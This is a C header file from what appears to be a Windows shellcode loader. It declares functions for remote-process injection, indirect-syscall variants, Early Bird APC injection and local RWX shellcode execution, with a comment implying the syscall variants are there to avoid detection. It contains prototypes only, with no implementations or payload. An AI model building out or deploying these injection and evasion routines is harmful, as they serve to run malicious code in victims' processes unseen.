#ifndef _INJECTION_H
#define _INJECTION_H

#include "common.h"

// =============================================
// Classic shellcode injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
// Uses WinAPIs - simpler but more detectable
// =============================================
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode);

// =============================================
// Classic injection via indirect syscalls
// Same logic but uses NtAllocateVirtualMemory, NtWriteVirtualMemory,
// NtProtectVirtualMemory, NtCreateThreadEx via indirect syscalls
// =============================================
BOOL InjectShellcodeSyscall(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode);

// =============================================
// Early Bird APC Injection
// Creates a suspended/debugged process, writes shellcode,
// queues APC to the main thread, then resumes
// =============================================
BOOL EarlyBirdApcInject(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, IN LPCSTR lpTargetProcess);

// =============================================
// Local shellcode execution (in current process)
// Allocates RWX memory, copies shellcode, executes via thread
// =============================================
BOOL LocalShellcodeExec(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode);

// =============================================
// Local shellcode execution via indirect syscalls
// =============================================
BOOL LocalShellcodeExecSyscall(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode);

// =============================================
// Process enumeration helper
// =============================================
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess);

#endif // _INJECTION_H
